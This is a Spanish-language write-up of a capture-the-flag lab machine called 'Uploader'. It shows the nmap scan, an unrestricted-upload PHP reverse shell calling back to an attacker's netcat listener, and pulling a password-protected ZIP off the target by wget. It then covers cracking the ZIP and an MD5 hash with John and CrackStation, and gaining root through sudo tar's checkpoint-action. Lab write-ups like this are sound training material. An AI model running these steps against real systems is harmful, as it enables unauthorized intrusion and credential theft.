# 🚩 Write-up: Uploader

Aquí va el write-up completo de la máquina **Uploader**. Te cuento cómo pasé del escaneo inicial a ser **root**, paso a paso.

Les dejo el link de la máquina:
https://labs.thehackerslabs.com/machines/127
---

## Fase 1: Reconocimiento 🗺️

**IP del Objetivo:** `192.168.18.198`

Lancé un Nmap con todo para no dejarme ni un puerto TCP sin revisar:

```bash
nmap -p- --open -sSCV --min-rate 5000 -n -Pn 192.168.18.198 -oN escaneo.txt
```

### ¿Qué hace este comando?

- `-p- --open`: Escanea todos los puertos y solo muestra los que están abiertos.
- `-sSCV`: Lanza scripts básicos y trata de adivinar la versión de los servicios.
- `--min-rate 5000 -n -Pn`: Escaneo rápido, asumiendo que la máquina está viva y evitando resolución de DNS.
- `-oN`: Guarda la salida en un archivo para revisarla después.

**Resultados:**

- **Puerto 80/tcp:** HTTP - Servidor web **Apache 2.4.41** sobre Ubuntu. ¡Mi puerta de entrada!

---

## Fase 2: Acceso Inicial (Shell como www-data) 💻

Con el puerto 80 abierto, el camino estaba claro: atacar la aplicación web.

### La Vulnerabilidad

Navegando a `http://192.168.18.198`, encontré un formulario para subir archivos en `/upload.php`. Probé a subir un par de cosas y la página no bloqueó nada, sin filtros visibles. Esto olía a **Subida de Archivos Sin Restricciones**.

### Preparando el Arma

El plan era simple: subir una **reverse shell en PHP** para tener control del servidor. Agarré un script típico (el de PentestMonkey) y le puse mi IP y un puerto para que me llamara de vuelta:

```php
$ip = '[TU_IP_ATACANTE]';
$port = 4444;
```

### A la Escucha

Dejé a Netcat esperando la conexión en mi máquina:

```bash
nc -nlvp 4444
```

### ¡Adentro!

Subí el `shell.php` a través del formulario. Fui a la carpeta `/uploads` (`http://192.168.18.198/uploads/shell.php`), hice clic en mi archivo y... ¡bingo! Saltó la conexión en mi terminal. Ya tenía una shell como el usuario **www-data**.

---

## Fase 3: Escalada de Privilegios (a operatorx) 🔑

Ser **www-data** está bien, pero no es suficiente. Había que escalar.

### Buscando,buscando y buscando. . .

Mirando en `/home`, vi que existía un usuario llamado `operatorx`. Lancé un `find` para buscar archivos interesantes:

```bash
find / -type f -name "*.zip" 2>/dev/null
```

Y apareció algo jugoso: `/srv/secret/File.zip`.

### Extrayendo el Botín

El ZIP pedía contraseña. Para crackearlo, primero tenía que pasarlo a mi máquina.

En la máquina víctima (**www-data**), levanté un servidor web temporal con Python:

```bash
# Navegar al directorio donde está el archivo
cd /srv/secret/

# Levantar el servidor
python3 -m http.server 8000
```

En mi máquina de atacante, usé `wget` para descargarlo:

```bash
wget http://192.168.18.198:8000/File.zip
```

### Crackeando la Contraseña

Con el archivo en mi poder, usé **zip2john** y **John the Ripper**:

```bash
# Extraer el hash del ZIP
zip2john File.zip > zip.hash

# Crackear con el diccionario rockyou.txt
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
```

**Contraseña del ZIP:** `supersecret`

### Obteniendo las Credenciales

Dentro del ZIP había un archivo de texto con:

```
operatorx:5d41402abc4b2a76b9719d911017c592
```

Ese hash parecía **MD5**. Lo metí en **CrackStation** y salió al instante.

**Contraseña de operatorx:** `qwerty`

### Cambiando de Identidad

Con la contraseña en mano, me convertí en el nuevo usuario:

```bash
su operatorx
```

---

## Fase 4: Escalada a Root 👑

Ya casi estaba. Solo quedaba el último paso para ser el dueño de la máquina.

### ¿Qué puedo hacer con sudo?

Para ver qué superpoderes tenía `operatorx`, tiré:

```bash
sudo -l
```

**Resultado:**

```
User operatorx may run the following commands on uploader:
    (root) NOPASSWD: /bin/tar
```

**Análisis:** ¡Jackpot! Podía ejecutar `/bin/tar` como root y sin pedir contraseña. Un vector de escalada clásico.

### El Truco Final con tar

Se puede abusar de una funcionalidad de tar para ejecutar lo que yo quiera. Como lo ejecuto con `sudo`, se corre como **root**:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash
```

**Cómo funciona:** Le digo a tar que cree un archivo de la nada, y justo después del primer "checkpoint", ejecute un comando: en este caso, una `/bin/bash`.

### ¡Somos Root!

Al ejecutar ese comando, la terminal se convirtió en una **shell de root**. Máquina comprometida.

